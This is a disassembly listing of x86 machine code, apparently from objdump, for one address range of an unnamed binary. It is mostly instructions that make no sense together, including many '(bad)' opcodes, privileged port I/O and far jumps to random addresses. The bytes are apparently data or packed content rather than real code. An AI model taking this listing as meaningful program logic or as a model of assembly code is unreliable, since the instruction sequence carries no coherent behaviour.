  41d41d:	adc    DWORD PTR [eax+ebp*1+0x4b],eax
  41d421:	mov    bl,BYTE PTR [ebx-0x6a]
  41d424:	les    ebx,FWORD PTR [esi-0x66]
  41d427:	fnsave [esp+esi*1]
  41d42a:	cmp    eax,0x25770625
  41d42f:	fidivr WORD PTR [esi-0x13]
  41d432:	jo     0x41d430
  41d434:	pop    esp
  41d435:	jle    0x41d457
  41d437:	lock mov BYTE PTR [edi+0x51],dl
  41d43b:	dec    esi
  41d43c:	shl    BYTE PTR [edi+0x11fda7d],cl
  41d442:	adc    al,0x9c
  41d444:	jo     0x41d421
  41d446:	dec    eax
  41d447:	out    dx,eax
  41d448:	sub    esp,DWORD PTR [ebp-0x3a]
  41d44b:	adc    cl,BYTE PTR [eax+0x73b4e37f]
  41d451:	rol    DWORD PTR [eax],cl
  41d453:	sub    dl,BYTE PTR ds:[esi]
  41d456:	mov    ds:0xd85c789c,al
  41d45b:	lods   eax,DWORD PTR ds:[esi]
  41d45c:	das    
  41d45d:	(bad)  
  41d45e:	popa   
  41d45f:	mov    edi,0x1cb0662e
  41d464:	in     al,dx
  41d465:	out    0x4a,eax
  41d467:	xchg   DWORD PTR [esi],ebp
  41d469:	sbb    DWORD PTR [esi+0x72],ecx
  41d46c:	sub    dh,bl
  41d46e:	dec    ebx
  41d46f:	sti    
  41d470:	pop    esp
  41d471:	sbb    al,0xe4
  41d473:	shr    DWORD PTR [esi-0x44e689f9],1
  41d479:	pop    ebp
  41d47a:	mov    ebx,DWORD PTR [ebx+ebp*8]
  41d47d:	dec    esp
  41d47e:	and    cl,BYTE PTR [esi-0x14]
  41d481:	loopne 0x41d464
  41d483:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d484:	dec    esp
  41d485:	js     0x41d4c0
  41d487:	sbb    al,0x61
  41d489:	aaa    
  41d48a:	aaa    
  41d48b:	stos   BYTE PTR es:[edi],al
  41d48c:	mov    fs,ebp
  41d48e:	inc    eax
  41d48f:	or     BYTE PTR [ebx],0xc0
  41d492:	and    ch,BYTE PTR [ecx]
  41d494:	mul    BYTE PTR [edi+0x597011a3]
  41d49a:	mul    BYTE PTR [ebx+0x54]
  41d49d:	or     DWORD PTR [eax],ecx
  41d49f:	dec    eax
  41d4a0:	pop    DWORD PTR [ebp-0x46]
  41d4a3:	loope  0x41d48c
  41d4a5:	push   cs
  41d4a6:	dec    ebx
  41d4a7:	pop    ss
  41d4a8:	mov    dl,0x70
  41d4aa:	adc    al,0xfa
  41d4ac:	mov    esp,0x98ee7ba1
  41d4b1:	cmp    BYTE PTR [esi+0x17],ah
  41d4b4:	jmp    0x11e0ed4d
  41d4b9:	mov    ch,0x8a
  41d4bb:	pusha  
  41d4bc:	int    0xe7
  41d4be:	in     al,0x3c
  41d4c0:	pop    esi
  41d4c1:	xchg   edx,eax
	...
  41d532:	add    BYTE PTR [eax],al
  41d534:	lds    esp,FWORD PTR [ebx]
  41d536:	xchg   ecx,eax
  41d537:	and    eax,0xe3f5b7f7
  41d53c:	push   ecx
  41d53d:	or     edi,DWORD PTR [edx+ecx*8-0x39480549]
  41d544:	or     BYTE PTR [ecx+eax*1],bh
  41d547:	add    dh,dh
  41d549:	add    BYTE PTR [eax],al
  41d54b:	add    BYTE PTR [edx+0x55],ch
  41d54e:	xchg   esi,eax
  41d54f:	and    bl,ah
  41d551:	push   ebp
  41d552:	mov    al,ds:0x1dc9b708
  41d557:	adc    BYTE PTR [edx-0x60],dl
  41d55a:	sub    al,0x82
  41d55c:	mov    eax,ds:0xcde48af8
  41d561:	pop    ebp
  41d562:	enter  0x4490,0xd3
  41d566:	into   
  41d567:	and    ebx,DWORD PTR [ebx-0x42afe7f0]
  41d56d:	(bad)  
  41d56e:	xor    esi,DWORD PTR [edx+edi*1+0x5f]
  41d572:	popw   es
  41d574:	arpl   WORD PTR [ecx+0x7ef0a0a1],sp
  41d57a:	imul   esp,DWORD PTR [esi],0xafc1a387
  41d580:	push   eax
  41d581:	or     BYTE PTR [eax+0x7],0x3f
  41d585:	stos   BYTE PTR es:[edi],al
  41d586:	daa    
  41d587:	rol    DWORD PTR [ebx+0xc6a9c88],1
  41d58d:	or     ah,BYTE PTR [ebx-0x46915379]
  41d593:	jb     0x41d595
  41d595:	test   bl,dl
  41d597:	jns    0x41d5c5
  41d599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d59a:	retf   
  41d59b:	mov    eax,ds:0xa8ec1e6b
  41d5a0:	sub    ecx,DWORD PTR [edi-0xf]
  41d5a3:	dec    ebp
  41d5a4:	sahf   
  41d5a5:	mov    ebp,0x43eb95f8
  41d5aa:	jp     0x41d5c4
  41d5ac:	xchg   edi,eax
  41d5ad:	adc    ebp,esp
  41d5af:	ins    BYTE PTR es:[edi],dx
  41d5b0:	hlt    
  41d5b1:	int3   
  41d5b2:	mov    bh,0xd
  41d5b4:	or     al,BYTE PTR [edi]
  41d5b6:	retf   0x417d
  41d5b9:	outs   dx,DWORD PTR ds:[esi]
  41d5ba:	enter  0x879f,0x2b
  41d5be:	jle    0x41d5c3
  41d5c0:	sbb    dl,BYTE PTR [ebx]
  41d5c2:	xor    al,dl
  41d5c4:	int3   
  41d5c5:	sbb    eax,DWORD PTR [ecx-0xd]
  41d5c8:	mov    ah,0xfa
  41d5ca:	and    edi,DWORD PTR [edi-0x15]
  41d5cd:	cld    
  41d5ce:	rcr    ebx,cl
  41d5d0:	ret    0x104f
  41d5d3:	or     bh,BYTE PTR [ecx]
  41d5d5:	cmp    eax,0x4a2cf948
  41d5da:	into   
  41d5db:	gs cs (bad) 
  41d5de:	std    
  41d5df:	fisub  WORD PTR [esi]
  41d5e1:	out    0xda,eax
  41d5e3:	pop    esp
  41d5e4:	push   ds
  41d5e5:	rol    bl,1
  41d5e7:	add    DWORD PTR [eax+0x6d],eax
  41d5ea:	(bad)  
  41d5eb:	sub    eax,0x4eb59459
  41d5f0:	push   0xb539a060
  41d5f5:	add    DWORD PTR [edi],0xc4c0796
  41d5fb:	push   esp
  41d5fc:	jge    0x41d629
  41d5fe:	mov    dl,0xbb
  41d600:	xor    DWORD PTR [eax+0x26],esi
  41d603:	in     al,dx
  41d604:	push   edi
  41d605:	dec    esi
  41d606:	imul   ebx,edx,0x58280254
  41d60c:	in     al,0x43
  41d60e:	out    0xec,al
  41d610:	mov    esp,0x3e8380b
  41d615:	mov    edx,0xf8e3d623
  41d61a:	cmp    ebp,eax
  41d61c:	add    eax,0x81d7eff4
  41d621:	scas   al,BYTE PTR es:[edi]
  41d622:	test   eax,0xf1141406
  41d627:	pop    ss
  41d628:	inc    edi
  41d629:	mov    esi,0x1992fd8
  41d62e:	sbb    al,0x5
  41d630:	mov    edx,0x962634c6
  41d635:	cmp    eax,0x79ae8131
  41d63a:	out    0x53,al
  41d63c:	xor    dh,bl
  41d63e:	mov    DWORD PTR [edi-0x37],0x2
	...
  41d6b1:	add    BYTE PTR [eax],al
  41d6b3:	add    dl,bl
  41d6b5:	add    edx,eax
  41d6b7:	xchg   bl,bl
  41d6b9:	(bad)  
  41d6ba:	ficomp WORD PTR [ebp+0x8]
  41d6bd:	push   0xcd10a3b
  41d6c2:	inc    edi
  41d6c3:	dec    ecx
  41d6c4:	(bad)  
  41d6c5:	cmp    al,0x1
  41d6c7:	add    dh,dh
  41d6c9:	add    BYTE PTR [eax],al
  41d6cb:	add    dl,cl
  41d6cd:	push   ecx
  41d6ce:	dec    edx
  41d6cf:	mov    dh,0xb6
  41d6d1:	call   0x5c21:0xb2118c1a
  41d6d8:	add    eax,0xe8ff7f80
  41d6dd:	cmp    ch,BYTE PTR [esi]
  41d6df:	jo     0x41d75b
  41d6e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6e3:	fs inc edx
  41d6e5:	add    BYTE PTR [edi+0x4ddd3c4e],ch
  41d6eb:	js     0x41d6b3
  41d6ed:	and    DWORD PTR [esi-0x21],ebp
  41d6f0:	dec    edx
  41d6f1:	push   esp
  41d6f2:	shl    DWORD PTR [ebx],cl
  41d6f4:	int3   
  41d6f5:	test   BYTE PTR [esi+0x247dba0b],dh
  41d6fb:	out    dx,eax
  41d6fc:	mov    bl,0x88
  41d6fe:	inc    ebp
  41d6ff:	or     esi,DWORD PTR ds:0x9026e601
  41d705:	xor    BYTE PTR [eax+ecx*8],0x77
  41d709:	mov    edi,0x25e33eb5
  41d70e:	mov    eax,ds:0x29323db4
  41d713:	imul   ebx,DWORD PTR [ecx-0x2c1a2a51],0xa568d97a
  41d71d:	cmp    eax,0x4a359160
  41d722:	and    BYTE PTR [edx-0x62],ch
  41d725:	jae    0x41d79d
  41d727:	(bad)  
  41d728:	mov    ebx,0xdaa9cc85
  41d72d:	add    al,dl
  41d72f:	xchg   ebp,eax
  41d730:	inc    ecx
  41d731:	xchg   esi,eax
  41d732:	hlt    
  41d733:	call   0x7b42a6d
  41d738:	mov    edx,0xeaf7e842
  41d73d:	cld    
  41d73e:	(bad)  
  41d73f:	push   ss
  41d740:	into   
  41d741:	push   ecx
  41d742:	addr16 js 0x41d735
  41d745:	mov    ebx,0xa6d06168
  41d74a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d74b:	mov    al,0x59
  41d74d:	push   eax
  41d74e:	das    
  41d74f:	cmp    eax,0x58c91d3
  41d754:	push   ebp
  41d755:	scas   al,BYTE PTR es:[edi]
  41d756:	pop    eax
  41d757:	jmp    0xabdb0240
  41d75c:	sub    eax,0x363bbe30
  41d761:	cmp    al,0xd4
  41d763:	sar    BYTE PTR [ebx],cl
  41d765:	loope  0x41d7e6
  41d767:	lea    ecx,[edi-0x52]
  41d76a:	mov    bl,0x2e
  41d76c:	push   cs
  41d76d:	outs   dx,BYTE PTR ds:[esi]
  41d76e:	cmp    edx,edi
  41d770:	fdiv   st(0),st
  41d772:	jecxz  0x41d6fa
  41d774:	bound  ecx,QWORD PTR ss:[ebp+esi*2+0x469429a0]
  41d77c:	in     eax,dx
  41d77d:	push   esp
  41d77e:	and    BYTE PTR [esi-0x65],0x7a
  41d782:	aad    0xd5
  41d784:	iret   
  41d785:	inc    eax
  41d786:	fbld   TBYTE PTR [ecx+eiz*4-0x68]
  41d78a:	ret    0x36cf
  41d78d:	add    bh,BYTE PTR [edx-0x134a0eee]
  41d793:	pop    esp
  41d794:	sbb    al,0x6
  41d796:	jae    0x41d75a
  41d798:	pop    esp
  41d799:	mov    eax,ds:0x9722495f
  41d79e:	mov    bl,BYTE PTR [esp+esi*2-0x30]
  41d7a2:	push   0xffffffa0
  41d7a4:	xchg   esi,eax
  41d7a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7a6:	jns    0x41d80a
  41d7a8:	xor    DWORD PTR [ebx+0x5],esi
  41d7ab:	test   BYTE PTR [ebx],bl
  41d7ad:	aaa    
  41d7ae:	jno    0x41d81e
  41d7b0:	push   cs
  41d7b1:	and    esi,ecx
  41d7b3:	cli    
  41d7b4:	or     bh,dh
  41d7b6:	mov    ds:0x77e1b20b,al
  41d7bb:	cmp    dh,ah
  41d7bd:	icebp  
  41d7be:	iret   
  41d7bf:	dec    ebx
  41d7c0:	test   al,0x41
	...
  41d832:	add    BYTE PTR [eax],al
  41d834:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41d83b:	ja     0x41d7c4
  41d83d:	repnz pop es
  41d83f:	add    ebp,DWORD PTR ds:0xf4a983b6
  41d845:	cmp    eax,0xf60001
  41d84a:	add    BYTE PTR [eax],al
  41d84c:	mov    ebp,0x1aecc2da
  41d851:	adc    edi,edx
  41d853:	out    dx,al
  41d854:	inc    esp
  41d855:	sahf   
  41d856:	aam    0x30
  41d858:	sti    
  41d859:	push   ds
  41d85a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d85b:	inc    esp
  41d85c:	call   0x2a7a4a1b
  41d861:	or     ebx,edx
  41d863:	mov    cl,ch
  41d865:	jne    0x41d8a3
  41d867:	pop    esp
  41d868:	rol    BYTE PTR [ecx],cl
  41d86a:	(bad)
  41d86e:	popf   
  41d86f:	inc    edi
  41d870:	in     al,0xaa
  41d872:	mov    eax,ds:0xb91fad6b
  41d877:	js     0x41d80e
  41d879:	daa    
  41d87a:	cmp    BYTE PTR [ecx-0x227b5983],al
  41d880:	xchg   ebx,eax
  41d881:	and    DWORD PTR [eax-0x24383928],edi
  41d887:	xor    ch,BYTE PTR gs:0xdf623e89
  41d88e:	push   cs
  41d88f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d890:	or     cl,0x34
  41d893:	lock add al,BYTE PTR [edi+0x50]
  41d897:	fwait
  41d898:	lods   eax,DWORD PTR ds:[esi]
  41d899:	fisubr WORD PTR [esi+ebx*1]
  41d89c:	pusha  
  41d89d:	mov    al,ds:0x41dc186f
  41d8a2:	adc    ecx,edx
  41d8a4:	adc    BYTE PTR [eax],0x8
  41d8a7:	cmp    eax,0xc97b4ec2
  41d8ac:	or     bl,BYTE PTR [eax+0x7]
  41d8af:	stos   BYTE PTR es:[edi],al
  41d8b0:	into   
  41d8b1:	in     eax,dx
  41d8b2:	rcr    DWORD PTR [edi],0x4e
  41d8b5:	mov    esp,0xbb9824bf
  41d8ba:	jge    0x41d863
  41d8bc:	or     ecx,DWORD PTR [esp+ebp*1+0x6c213efb]
  41d8c3:	push   0x6
  41d8c5:	hlt    
  41d8c6:	mov    bh,0xc0
  41d8c8:	mov    cl,0xe4
  41d8ca:	ins    BYTE PTR es:[edi],dx
  41d8cb:	retf   0xa906
  41d8ce:	pop    ds
  41d8cf:	out    dx,eax
  41d8d0:	inc    esi
  41d8d1:	hlt    
  41d8d2:	loope  0x41d92c
  41d8d4:	push   ebx
  41d8d5:	ud0    ecx,DWORD PTR [esi]
  41d8d8:	loope  0x41d923
  41d8da:	cmp    al,0x81
  41d8dc:	jmp    0xd96c:0xae47abc8
  41d8e3:	fldcw  WORD PTR [edx-0x2e9059a5]
  41d8e9:	enter  0xc9c4,0xb6
  41d8ed:	out    dx,eax
  41d8ee:	test   eax,0x811627d7
  41d8f3:	add    ecx,0xfffffff7
  41d8f6:	mov    edx,0xde62dd2e
  41d8fb:	js     0x41d91e
  41d8fd:	sbb    BYTE PTR [ecx],0xc0
  41d900:	scas   al,BYTE PTR es:[edi]
  41d901:	xchg   ebp,eax
  41d902:	mov    ch,0xf
  41d904:	or     dh,0xc4
  41d907:	adc    ah,BYTE PTR [ebx]
  41d909:	lock ficomp WORD PTR [edi]
  41d90c:	jns    0x41d956
  41d90e:	mov    DWORD PTR ds:0x5a227598,edx
  41d914:	dec    eax
  41d915:	scas   al,BYTE PTR es:[edi]
  41d916:	mov    ds:0x53ba8602,al
  41d91b:	in     eax,dx
  41d91c:	jne    0x41d932
  41d91e:	mov    al,ds:0x6c2e0b17
  41d923:	or     esi,0xfffffff0
  41d926:	test   al,0x76
  41d928:	mov    ss:0xbbaf712c,eax
  41d92e:	loop   0x41d9a4
  41d930:	xor    ebp,DWORD PTR [eax+eiz*4+0x30e1ad4b]
  41d937:	and    DWORD PTR [ecx-0x4c888d78],esi
  41d93d:	xchg   edx,eax
  41d93e:	mov    al,0x27
  41d940:	add    al,0x4d
	...
  41d9b2:	add    BYTE PTR [eax],al
  41d9b4:	lock retf 0xfc94
  41d9b8:	mov    esi,0xfdcef8fe
  41d9bd:	cwde   
  41d9be:	sbb    eax,0x228ac21c
  41d9c3:	dec    eax
  41d9c4:	jmp    0x0:0xf600013e
  41d9cb:	add    BYTE PTR [ebx+0x4e],bh
  41d9ce:	push   esp
  41d9cf:	call   0xdbd5bb46
  41d9d4:	scas   al,BYTE PTR es:[edi]
  41d9d5:	call   0xabe2:0x160dc290
  41d9dc:	aam    0x53
  41d9de:	shr    DWORD PTR [ebx-0x1c],1
  41d9e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9e2:	sub    ah,bl
  41d9e4:	xor    DWORD PTR [ecx+0x2c186e47],edi
  41d9ea:	fs adc al,0xcf
  41d9ed:	iret   
  41d9ee:	cli    
  41d9ef:	cdq    
  41d9f0:	push   cs
  41d9f1:	pushf  
  41d9f2:	ror    DWORD PTR [edx-0x6c],1
  41d9f5:	add    al,0xcb
  41d9f7:	jns    0x41da3c
  41d9f9:	xor    BYTE PTR [esi-0x4],dh
  41d9fc:	push   esp
  41d9fd:	push   edx
  41d9fe:	dec    edi
  41d9ff:	push   edi
  41da00:	push   ebx
  41da01:	jne    0x41da29
  41da03:	adc    edi,DWORD PTR [eax]
  41da05:	popa   
  41da06:	mov    al,0x7c
  41da08:	jmp    0x68373357
  41da0d:	arpl   WORD PTR [esi-0x4a],ax
  41da10:	shl    al,cl
  41da12:	mov    esi,0xebed4a44
  41da17:	pop    edi
  41da18:	mov    bl,0xb
  41da1a:	or     eax,0xb39daef0
  41da1f:	add    al,0xce
  41da21:	inc    eax
  41da22:	push   edi
  41da23:	es icebp 
  41da25:	les    ecx,FWORD PTR [esi+eax*8]
  41da28:	mov    ecx,0x7d8576f9
  41da2d:	fsub   DWORD PTR [edx-0x25d0846b]
  41da33:	scas   eax,DWORD PTR es:[edi]
  41da34:	cmp    ch,0x26
  41da37:	mov    cl,0x65
  41da39:	retf   0xb8e5
  41da3c:	lahf   
  41da3d:	or     eax,0x874c6819
  41da42:	push   ss
  41da43:	push   ebx
  41da44:	sub    al,0x23
  41da46:	(bad)  
  41da47:	jg     0x41da49
  41da49:	mov    edx,0xabe225bc
  41da4e:	sub    al,BYTE PTR [edx+0x11]
  41da51:	jecxz  0x41da0f
  41da53:	sbb    edx,DWORD PTR [esi+0x27]
  41da56:	add    dh,BYTE PTR [esi]
  41da58:	push   ss
  41da59:	scas   eax,DWORD PTR es:[edi]
  41da5a:	lds    edx,FWORD PTR [ecx+eiz*4-0xf50630a]
  41da61:	add    eax,0x94ac1bfb
  41da66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da67:	daa    
  41da68:	and    al,0xa1
  41da6a:	(bad)  
  41da6b:	jo     0x41da95
  41da6d:	ret    0x55f
  41da70:	into   
  41da71:	jb     0x41daef
  41da73:	push   edx
  41da74:	(bad)  
  41da76:	jp     0x41da3b
  41da78:	dec    edi
  41da79:	or     al,0x3c
  41da7b:	imul   edx,DWORD PTR [esi+0x5fe80124],0xbfbe21df
  41da85:	fcomp  DWORD PTR ds:0xa2723493
  41da8b:	and    DWORD PTR [ebx+esi*4+0x65],0xd137807b
  41da93:	push   esi
  41da94:	outs   dx,DWORD PTR ds:[esi]
  41da95:	mov    dh,0xfd
  41da97:	cwde   
  41da98:	adc    eax,0xe0d20fc4
  41da9d:	push   eax
  41da9e:	mov    BYTE PTR [ecx],bl
  41daa0:	push   ebp
  41daa1:	hlt    
  41daa2:	push   ebp
  41daa3:	and    ah,BYTE PTR [edx]
  41daa5:	mov    bl,0x2c
  41daa7:	or     BYTE PTR [ebp+0x3f],bl
  41daaa:	(bad)  
  41daab:	out    dx,al
  41daac:	jge    0x41dabd
  41daae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41daaf:	outs   dx,BYTE PTR ds:[esi]
  41dab0:	push   edx
  41dab1:	iret   
  41dab2:	or     al,0x6a
  41dab4:	pop    ebp
  41dab5:	popa   
  41dab6:	pop    edi
  41dab7:	arpl   WORD PTR [eax-0x7d888398],bp
  41dabd:	push   ds
  41dabe:	stos   DWORD PTR es:[edi],eax
  41dabf:	frstor [ebx+edi*1+0x0]
	...
  41db32:	add    BYTE PTR [eax],al
  41db34:	sub    esi,edx
  41db36:	sti    
  41db37:	pop    ebp
  41db38:	(bad)  
  41db39:	jge    0x41daea
  41db3b:	div    dl
  41db3d:	cmp    ebp,0xb
  41db40:	ss sub eax,ebx
  41db43:	inc    esi
  41db44:	loopne 0x41db85
  41db46:	add    DWORD PTR [eax],eax
  41db48:	test   BYTE PTR [eax],0x0
  41db4b:	add    BYTE PTR [ebp+ecx*8-0x66],al
  41db4f:	adc    eax,0x4368523b
  41db54:	imul   esi,DWORD PTR [eax],0xd9b23fae
  41db5a:	lahf   
  41db5b:	sub    BYTE PTR [edi-0x4],bl
  41db5e:	in     eax,dx
  41db5f:	adc    BYTE PTR [ebx+0x66],0xdc
  41db63:	xor    eax,0xd3e314fc
  41db68:	pushf  
  41db69:	out    dx,al
  41db6a:	or     eax,0xf4e8d8e4
  41db6f:	sub    al,0xc5
  41db71:	mov    eax,gs:0x1af45a67
  41db77:	jp     0x41dbd5
  41db79:	jmp    0x41dbc2
  41db7b:	popf   
  41db7c:	xchg   ecx,eax
  41db7d:	inc    edi
  41db7e:	sub    esp,edx
  41db80:	ss sub bh,0x40
  41db84:	xchg   esi,eax
  41db85:	sbb    edx,DWORD PTR [eax]
  41db87:	lea    edi,[ebx]
  41db89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db8a:	jno    0x41db70
  41db8c:	test   al,0x4b
  41db8e:	aad    0x2e
  41db90:	xchg   ecx,eax
  41db91:	sbb    DWORD PTR [ebp-0x70f6957b],0xae32df67
  41db9b:	jle    0x41dc01
  41db9d:	mov    esi,0x52e73952
  41dba2:	ret    0xf4a7
  41dba5:	push   edx
  41dba6:	test   eax,0x2e53f86f
  41dbab:	imul   edx,DWORD PTR [edi+0x7b5a388e],0xffffffbb
  41dbb2:	push   0xc23b7085
  41dbb7:	pop    ebx
  41dbb8:	mov    eax,DWORD PTR [ecx+0x23346cfd]
  41dbbe:	jp     0x41dbad
  41dbc0:	ret    0x4aa8
  41dbc3:	jmp    FWORD PTR [esi-0x10321a98]
  41dbc9:	mov    eax,0x19f9d3ec
  41dbce:	sub    DWORD PTR [edx+edi*2+0x28484f90],0xff7f82c5
  41dbd9:	xchg   ebx,eax
  41dbda:	pop    ecx
  41dbdb:	jae    0x41dbb3
  41dbdd:	add    BYTE PTR [edi-0x64],al
  41dbe0:	sub    eax,ecx
  41dbe2:	pop    ds
  41dbe3:	stos   BYTE PTR es:[edi],al
  41dbe4:	std    
  41dbe5:	int    0xf2
  41dbe7:	adc    BYTE PTR [eax+ebx*1+0x4e],bl
  41dbeb:	popf   
  41dbec:	lds    eax,FWORD PTR [edi+0x1b]
  41dbef:	(bad)  
  41dbf0:	test   al,0x93
  41dbf2:	cli    
  41dbf3:	out    dx,al
  41dbf4:	inc    ebx
  41dbf5:	ja     0x41db9e
  41dbf7:	out    0xff,eax
  41dbf9:	pop    ebp
  41dbfa:	outs   dx,BYTE PTR ds:[esi]
  41dbfb:	jg     0x41dc4c
  41dbfd:	dec    edi
  41dbfe:	jmp    0x234b9e1a
  41dc03:	adc    DWORD PTR [eax],ebx
  41dc05:	adc    ecx,DWORD PTR ds:[ebp-0x18]
  41dc09:	pusha  
  41dc0a:	retf   0xb32
  41dc0d:	inc    ebp
  41dc0e:	jnp    0x41dbfd
  41dc10:	sbb    ebx,DWORD PTR [edx+0x22]
  41dc13:	xchg   BYTE PTR [ebp+0x6d],cl
  41dc16:	fist   DWORD PTR cs:[esi-0x4581a698]
  41dc1d:	inc    edi
  41dc1e:	xor    al,0xc2
  41dc20:	cmp    ecx,esi
  41dc22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc23:	jmp    0x41dc8d
  41dc25:	mov    bl,BYTE PTR [edx+ebp*2-0x28f60304]
  41dc2c:	stc    
  41dc2d:	sub    bl,BYTE PTR [ebx+0x22be8cc1]
  41dc33:	jae    0x41dc24
  41dc35:	dec    eax
  41dc36:	push   es
  41dc37:	int3   
  41dc38:	dec    ebx
  41dc39:	sahf   
  41dc3a:	shl    DWORD PTR [ecx+0x3e1959a],cl
  41dc40:	xlat   BYTE PTR ds:[ebx]
  41dc41:	out    dx,al
	...
  41dcb2:	add    BYTE PTR [eax],al
  41dcb4:	pusha  
  41dcb5:	cdq    
  41dcb6:	fsubr  st(5),st
  41dcb8:	std    
  41dcb9:	in     eax,0x79
  41dcbb:	popf   
  41dcbc:	jle    0x41dc59
  41dcbe:	es and al,0xa
  41dcc1:	push   0x40d6f4c0
  41dcc6:	add    DWORD PTR [eax],eax
  41dcc8:	test   BYTE PTR [eax],0x0
  41dccb:	add    BYTE PTR [edx],cl
  41dccd:	add    BYTE PTR [esi-0x1f1211e4],bl
  41dcd3:	jmp    0xd293288a
  41dcd8:	(bad)  
  41dcd9:	mov    cl,0x1f
  41dcdb:	lods   al,BYTE PTR ds:[esi]
  41dcdc:	xor    al,0x95
  41dcde:	push   ebx
  41dcdf:	imul   esi,DWORD PTR [edx-0x2a3050e4],0x2d4769f5
  41dce9:	in     eax,dx
  41dcea:	lea    ecx,[ecx]
  41dcec:	fadd   st(0),st
  41dcee:	clc    
  41dcef:	mov    bh,0xd
  41dcf1:	pop    edx
  41dcf2:	inc    edx
  41dcf3:	(bad)
  41dcf6:	retf   
  41dcf7:	test   eax,0xbc5ecdc2
  41dcfc:	lods   al,BYTE PTR ds:[esi]
  41dcfd:	jle    0x41dd16
  41dcff:	push   ds
  41dd00:	mov    bl,BYTE PTR [edx+0x3dbcd6aa]
  41dd06:	jns    0x41dc8b
  41dd08:	push   0xa60643a6
  41dd0d:	loopne 0x41dd29
  41dd0f:	mov    bl,0xdf
  41dd11:	ins    DWORD PTR es:[edi],dx
  41dd12:	jp     0x41dd8d
  41dd14:	and    BYTE PTR [ebp-0x2607c29a],cl
  41dd1a:	cmp    al,0x4b
  41dd1c:	cli    
  41dd1d:	js     0x41dd94
  41dd1f:	xchg   BYTE PTR [edi+0x15f21b0e],ah
  41dd25:	adc    al,0x76
  41dd27:	and    eax,0xa9efd602
  41dd2c:	push   ebx
  41dd2d:	xchg   ecx,eax
  41dd2e:	sbb    eax,DWORD PTR [esi+0x188651ad]
  41dd34:	ss test al,0xd7
  41dd37:	jg     0x41dd17
  41dd39:	lods   eax,DWORD PTR ds:[esi]
  41dd3a:	(bad)  
  41dd3b:	cdq    
  41dd3c:	hlt    
  41dd3d:	cmp    eax,0xa97be301
  41dd42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd43:	aaa    
  41dd44:	in     al,dx
  41dd45:	dec    eax
  41dd46:	bound  eax,QWORD PTR [esi-0xde38ebb]
  41dd4c:	mov    dh,0xa0
  41dd4e:	mov    ds:0x430c9130,al
  41dd53:	jo     0x41dd9d
  41dd55:	cmp    ebx,edx
  41dd57:	cli    
  41dd58:	and    eax,0xfdd63df6
  41dd5d:	add    bh,BYTE PTR [ebp+edi*2+0xd922c33]
  41dd64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd65:	sbb    eax,0x66574fb7
  41dd6a:	outs   dx,DWORD PTR ds:[esi]
  41dd6b:	dec    edi
  41dd6c:	jbe    0x41dd98
  41dd6e:	sub    al,0x8c
  41dd70:	push   es
  41dd71:	retf   0xa957
  41dd74:	repz das 
  41dd76:	into   
  41dd77:	mov    bl,0xfa
  41dd79:	xor    edi,DWORD PTR [ebx-0x52]
  41dd7c:	cdq    
  41dd7d:	pop    eax
  41dd7e:	cmp    ebx,edx
  41dd80:	enter  0x9ac,0xc7
  41dd84:	repz and dl,bl
  41dd87:	push   ebp
  41dd88:	icebp  
  41dd89:	sub    DWORD PTR [eax+0x13961f9a],0xffffffb1
  41dd90:	add    eax,0xc7b0487b
  41dd95:	sub    BYTE PTR [edi],al
  41dd97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd98:	lods   al,BYTE PTR ds:[esi]
  41dd99:	loop   0x41dd7e
  41dd9b:	lods   eax,DWORD PTR ds:[esi]
  41dd9c:	adc    DWORD PTR [bx+si-0x30],esi
  41dda0:	cmp    eax,0x11cff0ec
  41dda5:	mov    dh,0x15
  41dda7:	pusha  
  41dda8:	cmp    DWORD PTR [eax],esi
  41ddaa:	mov    bl,0x79
  41ddac:	mov    bl,0x4c
  41ddae:	sub    BYTE PTR [edx+0x2da46bc5],ah
  41ddb4:	dec    ebp
  41ddb5:	sub    DWORD PTR [ebx+0x1df0fbc5],0xa009bd7
  41ddbf:	fcomi  st,st(0)
  41ddc1:	xor    al,BYTE PTR [eax]
	...
  41de33:	add    BYTE PTR [edi],al
  41de35:	jp     0x41de1f
  41de37:	jnp    0x41de36
  41de39:	sti    
  41de3a:	xchg   edi,eax
  41de3b:	jle    0x41ddf3
  41de3d:	popf   
  41de3e:	loopne 0x41ddc2
  41de40:	outs   dx,BYTE PTR ds:[esi]
  41de41:	lods   al,BYTE PTR ds:[esi]
  41de42:	or     esp,DWORD PTR [ebx+0x141cc]
  41de48:	test   BYTE PTR [eax],0x0
  41de4b:	add    BYTE PTR [ecx+ebx*8],dl
  41de4e:	sub    eax,DWORD PTR [ebp+0x43]
  41de51:	xor    BYTE PTR [ebp+ebx*4+0x7b8926fb],ch
  41de58:	add    al,BYTE PTR [esi]
  41de5a:	pop    edi
  41de5b:	adc    bh,BYTE PTR [esi]
  41de5d:	mov    ds:0xd3d4b020,eax
  41de62:	out    0x5d,eax
  41de64:	sbb    BYTE PTR [ebp-0x62],bh
  41de67:	xchg   ebp,eax
  41de68:	iret   
  41de69:	fadd   QWORD PTR [esi-0x69]
  41de6c:	mov    esi,0x846bba72
  41de71:	rol    DWORD PTR [edi-0x5b],cl
  41de74:	pop    ebp
  41de75:	add    ecx,ebp
  41de77:	test   DWORD PTR [eax],ecx
  41de79:	sbb    DWORD PTR [edx+edx*1],ebp
  41de7c:	lock xchg esi,eax
  41de7e:	inc    eax
  41de7f:	not    BYTE PTR [edi+eiz*2+0x1b]
  41de83:	test   bl,cl
  41de85:	(bad)  
  41de86:	mov    ah,0x5f
  41de88:	and    al,0xc1
  41de8a:	ret    
